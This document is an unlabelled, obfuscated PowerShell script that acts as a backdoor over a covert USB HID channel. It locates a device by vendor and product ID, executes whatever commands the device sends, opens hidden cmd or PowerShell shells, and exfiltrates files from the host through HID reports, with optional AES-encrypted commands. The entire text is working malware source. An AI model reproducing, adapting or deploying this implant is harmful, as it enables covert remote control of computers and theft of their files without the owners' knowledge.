$VI=0x24ae;$PI=0x2015;$UP=0xFF00;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$RU=1000;$MR=20;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_SetOutputReport(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)-and$a.v-eq$VI-and$a.p-eq$PI){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if(!$UP-or$c.up-eq$UP){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)}[H]::SetupDiDestroyDeviceInfoList($s)>$x}
function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
function SO($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=($D.O-1)){$z=[Math]::Min($D.O-1,$A.Length-$i);$p=[byte[]]::new($D.O);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetOutputReport($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){Write-Host "SEND FAIL after $MR retries";break}Sleep -M 5};[H]::U($RU)}}
function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG-and$sb[2]-eq0xFF){return $true}}}catch{};return $false}
function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SO $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){if(($cn%50-eq0)-and(CS $D)){W $D "STOPPED";return};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SO $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SO $D ([byte[]]@($MG,0xCC))}
function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
$d=G;if(!$d){exit}W $d "Ready";$bf="";$rx=0;while(1){$b=[byte[]]::new($d.I);$r=0;if([H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0){$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}Sleep -M 5}